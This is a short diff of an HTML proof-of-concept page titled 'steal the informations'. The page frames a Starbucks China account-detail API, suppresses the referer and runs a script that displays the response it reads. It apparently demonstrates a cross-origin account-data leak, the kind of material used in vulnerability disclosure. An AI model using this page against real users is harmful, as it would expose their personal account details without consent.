@@ -1,5 +1,8 @@
+<!DOCTYPE html>
 <html>
+<head>
 <meta name="referer" content="never" />
+</head>
 <title>steal the informations</title>
 <iframe src="https://profile.starbucks.com.cn/api/account/detail"></iframe>
 <script>
@@ -9,7 +12,7 @@
 		if (xmlhttp.readyState==4 && xmlhttp.status==200)
 		{
 			alert(xmlhttp.responseText);
-			alert("success");
+			console.log("success");
 		}
 	}
     	
